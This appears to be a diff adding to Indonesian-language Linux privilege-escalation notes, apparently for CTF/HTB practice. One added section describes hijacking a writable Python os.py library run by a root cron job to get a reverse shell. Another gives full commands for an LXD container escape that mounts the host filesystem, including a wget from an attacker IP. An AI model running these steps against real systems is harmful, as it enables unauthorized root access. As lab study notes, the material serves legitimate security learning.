@@ -13,8 +13,34 @@ Terus cari exploitnya -> Compile -> Run -> Boom
 # Cron Jobs
 Untuk cron jobs ini terkadang kita gak tau apakah ada atau tidak, nah cara untuk mengetahuinya bisa menggunakan tools pspy
 https://github.com/DominicBreuker/pspy
-
 Jadi tools ini akan melakukan monitoring, perintah-perintah apa saja yang dilajalankan oleh user lain termasuk root
+## Priv Esc Via Python Library & Cron Jobs
+Pada mesin HTB friendzone, terdapat case yang menarik dimana ada cron jobs yang menjalankan script python. 
+Menggunakan `pspy`
+```
+2022/06/27 08:40:01 CMD: UID=0    PID=41738  | /usr/bin/python /opt/server_admin/reporter.py 
+2022/06/27 08:40:01 CMD: UID=0    PID=41737  | /bin/sh -c /opt/server_admin/reporter.py 
+2022/06/27 08:40:01 CMD: UID=0    PID=41736  | /usr/sbin/CRON -f 
+
+```
+namun file ini tidak writable. Pada script tsb terdapat import library `os`
+
+```
+#!/usr/bin/python
+
+import os
+
+to_address = "admin1@friendzone.com"
+from_address = "admin2@friendzone.com"
+```
+
+Dan ternyata library os ini bisa diedit dan kita tinggal memasukkan reverse shell script python ke dalam file
+```
+/usr/lib/python2.7/os.py
+```
+
+Kemudian cronjob akan memanggil script tersebut dan boom!
+
 
 # Checklist
 ![[linux_privesc.jpg]]
@@ -114,6 +140,38 @@ ps aux | grep andy
 ```
 
 Nah jika ada maka tes proses/aplikasi yang dijalankan apakah ada RCE
+
+# LXD Container
+Cek apakah ada user lxd lalu jalankan command ini 
+
+## Attacker Machine
+```
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+```
+
+Hasil dari build aplhine akan ada file .tar.gz, contohnya `apline-v3.10-x86_64-20191008_1227.tar.gz` , ini kemudian kita upload di victim machine
+
+## Victim Machine
+
+```
+cd /tmp
+wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz
+lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
+lxc image list
+```
+
+![Container](https://1.bp.blogspot.com/-yy1afthCNsc/XaHYJSIM37I/AAAAAAAAg5g/KTDuZuVIjmMzqEzlMsNY0E59r7UDV28tACLcBGAsYHQ/s1600/11.png)
+
+```
+lxd init
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id
+```
 
 ## Another Reference
 ### xhxBrofessor
